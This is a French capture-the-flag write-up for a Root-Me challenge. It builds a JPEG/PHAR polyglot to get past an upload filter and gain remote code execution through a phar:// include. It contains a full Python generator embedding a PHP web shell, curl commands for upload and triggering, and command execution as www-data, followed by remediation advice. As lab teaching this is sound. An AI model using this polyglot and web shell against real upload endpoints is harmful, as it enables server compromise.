# Write-up — Upload JPEG & exécution de PHAR (polyglot)

> **Plateforme :** Root-Me — challenge Web-Serveur
> **Thème :** upload de fichier, fichier *polyglot* JPEG/PHAR, inclusion via `phar://`
> **Flag :** `NowYouAreBilingual!`
> **Niveau du write-up :** débutant — chaque notion est expliquée.

---

## 1. En une phrase

Le site accepte des images JPEG et possède une page admin capable « d'exécuter un PHAR ».
On va fabriquer un fichier qui est **à la fois une image JPEG valide ET une archive PHP (PHAR)** — un *polyglot* — l'uploader comme une simple photo, puis demander à l'admin de l'« exécuter » pour faire tourner **notre** code PHP sur le serveur (RCE).

---

## 2. Les notions à connaître

### 2.1 Un *polyglot*, c'est quoi ?

Un fichier **polyglot** est un fichier valide dans **deux formats en même temps**.
Ici : valide comme **JPEG** (pour passer le filtre d'upload) **et** comme **PHAR** (pour contenir du code PHP exécutable).

C'est possible parce que les deux formats « regardent » le fichier différemment :

- Un lecteur **JPEG** lit le début du fichier, suit les marqueurs, et **s'arrête au marqueur de fin** `FF D9`. Tout ce qui vient après, il s'en moque.
- Le lecteur **PHAR** de PHP, lui, **cherche dans tout le fichier** le mot-clé `__HALT_COMPILER();`. Il se fiche de ce qu'il y a avant.

→ On met donc un **vrai petit JPEG** au début, puis on colle **l'archive PHAR juste après**. Chacun est content.

```
┌──────────────── fichier .jpg uploadé ────────────────┐
│ FF D8 ... FF D9      │  __HALT_COMPILER(); + archive  │
│  (JPEG, point final) │  (PHAR : notre code PHP)       │
└──────────────────────┴────────────────────────────────┘
     ↑ ce que lit le          ↑ ce que lit PHP quand on
       validateur d'upload       fait include("phar://...")
```

### 2.2 Un PHAR, c'est quoi ?

Un **PHAR** (*PHP Archive*) est à PHP ce qu'un `.jar` est à Java : une archive qui empaquette plusieurs fichiers PHP dans un seul fichier, qu'on peut exécuter ou inclure.

Pour lire **un fichier à l'intérieur** d'un PHAR, PHP utilise une URL spéciale, le *stream wrapper* `phar://` :

```php
include("phar://chemin/vers/archive.phar/un_fichier_interne.php");
```

Point crucial pour nous : **l'archive peut s'appeler `.jpg`**, ça ne change rien. PHP regarde le **contenu**, pas l'extension. D'où le polyglot.

### 2.3 Pourquoi PHP 8 change la donne

Historiquement (PHP ≤ 7.x), le simple fait de toucher un `phar://` avec une fonction comme `file_exists()` **désérialisait automatiquement** des métadonnées stockées dans le PHAR → c'était la fameuse « attaque de désérialisation PHAR » (gadget chains).

Le serveur ici tourne sous **PHP 8.0.30**, et cette désérialisation automatique **a été supprimée en PHP 8.0**. Donc cette voie-là est morte.

**Mais** le challenge ne nous le demande pas : la page admin fait carrément un `include()`. Or `include()` sur un PHAR **exécute le code PHP qu'il contient**. Pas besoin de désérialisation : on met un `shell.php` dans l'archive et on le fait inclure. Cette méthode marche très bien en PHP 8.

---

## 3. Reconnaissance (comprendre la cible)

### 3.1 La page d'accueil

Une galerie photo avec un formulaire d'upload « JPEG only », champ `image[]`, et un lien « Admin area » (`?page=admin`).

### 3.2 La page admin

> *"This is the admin interface where I can **execute PHAR files** to update my site.
> You can't use it anyway because you don't know where the PHAR files are located."*

Un champ texte `phar` = **le chemin** vers un PHAR. Le « tu ne sais pas où ils sont » est un leurre : on va voir que le chemin d'upload est affiché en clair.

### 3.3 Tester l'upload pour voir ce qu'il répond

On envoie un mini-JPEG bidon et on regarde la réponse HTTP (avec `curl`) :

```bash
# un JPEG minimal : SOI(FFD8) + APP0 + EOI(FFD9)
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > mini.jpg
curl -s -F 'image[]=@mini.jpg;type=image/jpeg;filename=probe.jpeg' \
     "http://challenge01.root-me.org:PORT/"
```

Réponse (extrait) :

```html
X-Powered-By: PHP/8.0.30
...
This is a valid JPEG! You can <a href="./uploads/phpQaD16a.jpg">go see it here</a>.
```

**Trois infos en or :**
1. **PHP 8.0.30** → on oublie la désérialisation, on vise l'`include`.
2. Le fichier est **stocké** dans `./uploads/` avec un nom aléatoire `phpXXXXXX.jpg`.
3. **Le chemin exact est renvoyé dans la réponse** → plus besoin de le deviner.

### 3.4 Identifier ce que fait la page admin (le *sink*)

On envoie des valeurs au champ `phar` et on lit les **messages d'erreur** (ils sont très bavards) :

```bash
curl -s "http://.../?page=admin" --data-urlencode "phar=./uploads/phpXXXX.jpg"
```

Erreur renvoyée :

```
include(): Failed opening 'phar://./uploads/phpXXXX.jpg' for inclusion
```

→ Le code fait donc **`include("phar://" . $_POST['phar'])`**.
On contrôle tout ce qui suit `phar://`. Pour exécuter un fichier interne, on fournira :

```
phar = ./uploads/phpXXXX.jpg/shell.php
```

qui devient `include("phar://./uploads/phpXXXX.jpg/shell.php")`.

### 3.5 Comprendre exactement le filtre d'upload

On teste plusieurs fichiers pour voir ce qui est accepté ou rejeté :

| Fichier testé                                   | Résultat |
|-------------------------------------------------|----------|
| `FFD8` + APP0 + `FFD9`                           | ✅ accepté |
| idem + données binaires après `FFD9`            | ✅ accepté |
| idem + `<?php echo 1; ?>` après `FFD9`           | ✅ accepté |
| `FFD8` + APP0 + `<?php` (**sans `FFD9`**)        | ❌ rejeté |

**Conclusion** : le filtre exige seulement que le fichier **commence par `FFD8`** et **contienne `FFD9` quelque part**. Il ne bloque pas `<?php` et tolère n'importe quelle donnée après l'EOI.

> On l'a confirmé ensuite avec le code source récupéré via notre RCE (voir §6).

---

## 4. Fabriquer le polyglot — le code Python expliqué

On n'a **pas besoin de PHP** pour créer un PHAR : son format binaire est documenté, on peut le construire et le signer (SHA1) à la main en Python.

### 4.1 Structure d'un fichier PHAR

```
[ STUB ]        du texte quelconque qui se termine par "__HALT_COMPILER(); ?>"
[ MANIFEST ]    la "table des matières" : nb de fichiers, flags, métadonnées,
                et une entrée par fichier (nom, taille, crc32, permissions…)
[ CONTENUS ]    les octets de chaque fichier interne, à la suite
[ SIGNATURE ]   un hash (ici SHA1) de tout ce qui précède + "GBMB"
```

Toutes les tailles/nombres sont des entiers 32 bits **little-endian** (`<I` en Python `struct`).

Pour le polyglot, notre **STUB** = un vrai petit JPEG (terminé par `FFD9`) suivi de `<?php __HALT_COMPILER(); ?>`.

### 4.2 Le script complet : `make_phar.py`

```python
#!/usr/bin/env python3
"""
Genere un polyglot JPEG + PHAR contenant un fichier PHP interne (shell.php).
Pur Python, pas besoin de PHP. Cible : include("phar://".$_POST['phar'])
"""
import struct, zlib, hashlib, sys

# JPEG complet et valide jusqu'a EOI (FFD9) : passe le validateur d'upload.
# Le phar est place APRES (trailer tolere). PHP trouve __HALT_COMPILER() n'importe ou.
JPEG_HEADER = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"

def build_phar(inner_name: bytes, inner_data: bytes,
               metadata: bytes = b"N;",           # metadata = null (inutile en PHP8)
               stub_prefix: bytes = JPEG_HEADER) -> bytes:
    # --- STUB : notre JPEG, puis le token que PHP cherche ---
    stub = stub_prefix + b"<?php __HALT_COMPILER(); ?>\r\n"

    # --- une entree de fichier dans le MANIFEST (notre shell.php) ---
    crc = zlib.crc32(inner_data) & 0xffffffff
    entry  = struct.pack("<I", len(inner_name)) + inner_name  # nom + sa longueur
    entry += struct.pack("<I", len(inner_data))   # taille non compressee
    entry += struct.pack("<I", 0)                  # timestamp
    entry += struct.pack("<I", len(inner_data))   # taille "compressee" (= pareil, pas de compression)
    entry += struct.pack("<I", crc)                # crc32 du contenu
    entry += struct.pack("<I", 0x000001B6)         # flags : permissions 0666 (fichier LISIBLE)
    entry += struct.pack("<I", 0)                  # longueur metadata du fichier (0)

    # --- MANIFEST global ---
    alias = b""
    manifest  = struct.pack("<I", 1)               # nombre de fichiers dans l'archive : 1
    manifest += b"\x11\x00"                         # version de l'API phar (1.1.0)
    manifest += struct.pack("<I", 0x00010000)      # flags globaux : "signature presente"
    manifest += struct.pack("<I", len(alias)) + alias
    manifest += struct.pack("<I", len(metadata)) + metadata
    manifest += entry
    manifest  = struct.pack("<I", len(manifest)) + manifest  # on prefixe la longueur totale

    # --- assemblage + SIGNATURE SHA1 ---
    body = stub + manifest + inner_data
    body += hashlib.sha1(body).digest() + struct.pack("<I", 0x0002) + b"GBMB"  # 0x0002 = SHA1
    return body

if __name__ == "__main__":
    out  = sys.argv[1] if len(sys.argv) > 1 else "exploit.jpg"
    code = sys.argv[2] if len(sys.argv) > 2 else \
        "<?php echo '[PWNED]'; system($_REQUEST['c'] ?? 'id'); ?>"
    data = build_phar(b"shell.php", code.encode("latin-1"))
    with open(out, "wb") as f:
        f.write(data)
    print(f"[+] {out} ({len(data)} octets)  debut={data[:4].hex()} (ffd8ffe0 attendu)")
    print(f"[+] fichier interne : shell.php")
    print(f"[+] upload puis:  phar = ./uploads/<NOM>.jpg/shell.php")
```

### 4.3 Les pièges à connaître (expliqués)

- **Terminer le JPEG par `FFD9`** : sans ce marqueur de fin, le validateur rejette (il considère que l'image est cassée dès qu'il tombe sur `<?php`). C'est **le** détail qui fait échouer la plupart des premières tentatives.
- **Permissions `0x1B6` (= `0666`)** sur le fichier interne : si on laisse `0`, le fichier est « non lisible » et l'`include` échoue silencieusement.
- **Flag global `0x00010000`** : annonce qu'une signature est présente ; il **faut** alors vraiment écrire la signature à la fin, sinon PHP refuse l'archive.
- **Signature SHA1 calculée sur tout le corps** (JPEG inclus) : comme on préfixe le JPEG, il fait partie du STUB, donc il entre dans le calcul du hash. Le script le fait automatiquement.
- **`<?php` dans `shell.php`** : nécessaire pour que le code s'exécute à l'`include`. Ici le filtre ne bloque pas `<?php`, donc aucun souci. (Si un filtre bloquait `<?php`, on utiliserait la balise courte `<?=`.)

---

## 5. L'exploitation, étape par étape

On automatise tout en Bash + curl. (Remplace `PORT` par le port de ton instance.)

```bash
B="challenge01.root-me.org:PORT"

# 1) generer le polyglot
python make_phar.py exploit.jpg

# 2) l'uploader comme une photo et recuperer le chemin renvoye
RESP=$(curl -s -F 'image[]=@exploit.jpg;type=image/jpeg;filename=cute.jpeg' "http://$B/")
UP=$(echo "$RESP" | grep -o 'uploads/[A-Za-z0-9]*\.jpg' | head -1)
echo "[+] uploade dans : $UP"

# 3) declencher l'include du fichier interne -> RCE
curl -s "http://$B/?page=admin" --data-urlencode "phar=./$UP/shell.php"
```

Résultat (extrait) :

```
[PWNED]uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

→ **On exécute des commandes en tant que `www-data`.** C'est gagné.

### 5.1 Passer des commandes à la volée

Notre `shell.php` lit `$_REQUEST['c']`. On ajoute donc un paramètre `c=` dans l'URL :

```bash
# lister la racine web
curl -s "http://$B/?page=admin&c=ls%20-la%20/var/www/html" \
     --data-urlencode "phar=./$UP/shell.php"
```

On trouve alors :

```
flag-juygaz36YyTFyT6R.txt
index.php
uploads/
```

### 5.2 Lire le flag

```bash
curl -s "http://$B/?page=admin&c=cat%20/var/www/html/flag-juygaz36YyTFyT6R.txt" \
     --data-urlencode "phar=./$UP/shell.php"
```

```
NowYouAreBilingual!
```

🚩 **Flag : `NowYouAreBilingual!`** — un clin d'œil au thème : notre fichier est « bilingue » (JPEG + PHP).

> Remarque : certaines instances nettoient `uploads/` régulièrement. Si l'`include` échoue avec une erreur de fichier introuvable, **ré-uploade** `exploit.jpg` pour obtenir un nouveau chemin, puis relance le trigger.

---

## 6. Le code source de la cible (récupéré via la RCE)

Avec notre accès, on a lu `index.php`, ce qui confirme toute l'analyse :

```php
<?php
if (isset($_FILES["image"])){
    $filename = $_FILES["image"]["tmp_name"][0];
    $handle   = fopen($filename, "rb");
    $content  = fread($handle, filesize($filename));

    // "Check this is a valid JPEG and not a PHP file"
    if (
           (strpos($_FILES["image"]["name"][0],".jpg") || strpos($_FILES["image"]["name"][0],".jpeg"))
        && strcmp(substr($content, 0, 2), hex2bin('ffd8')) === 0   // commence par FF D8
        && strpos($content, hex2bin('ffd9'))                        // contient FF D9
    ){
        $name = basename($filename);
        move_uploaded_file($filename, __DIR__ . '/uploads/' . $name . '.jpg');
        echo 'This is a valid JPEG! You can go see it here.';
    } else {
        echo 'This is a fake JPEG!';
    }
} elseif (isset($_POST["phar"])){
    $pharFile = $_POST["phar"];
    if (@include("phar://" . $pharFile)) {       // <-- le sink
        echo 'PHAR file executed successfully!';
    }
}
```

On voit clairement les deux faiblesses :
1. Le filtre « JPEG » se contente de `FFD8` au début + `FFD9` présent → trivialement contournable par un polyglot.
2. `@include("phar://" . $pharFile)` avec une entrée utilisateur → exécution de code via une archive qu'on a nous-mêmes uploadée.

---

## 7. Résumé express (TL;DR)

1. Le filtre d'upload n'exige que `FF D8` au début et `FF D9` quelque part → on fabrique un **polyglot JPEG+PHAR**.
2. On **uploade** le polyglot ; la réponse **révèle le chemin** `uploads/phpXXXX.jpg`.
3. La page admin fait `include("phar://" . input)` → on passe `./uploads/phpXXXX.jpg/shell.php`.
4. Le `shell.php` interne s'exécute → **RCE** → on lit le flag.

```
Flag : NowYouAreBilingual!
```

---

## 8. Comment un développeur corrige ça

- **Valider réellement l'image** : `getimagesize()` + ré-encoder l'image (ex. `imagecreatefromjpeg()` puis `imagejpeg()`) détruit tout payload caché.
- **Renommer et forcer l'extension** côté serveur, stocker hors de la racine web, servir avec `Content-Disposition: attachment`.
- **Ne jamais** passer une entrée utilisateur à `include` / `phar://` / fonctions filesystem. Interdire le wrapper `phar://` si inutile (`phar.readonly`, filtrage des wrappers).
- Ne pas afficher les chemins d'upload ni les messages d'erreur détaillés en production.

---

## 9. Fichiers du dépôt

| Fichier          | Rôle                                                        |
|------------------|------------------------------------------------------------|
| `make_phar.py`   | Génère le polyglot JPEG+PHAR (code complet au §4.2)         |
| `exploit.jpg`    | Le polyglot produit, prêt à uploader                       |
| `upload.txt`     | Requête Burp d'upload (reconnaissance)                     |
| `admin.txt`      | Requête Burp de la page admin (le *sink*)                  |
| `writeup.md`     | Ce document                                                |
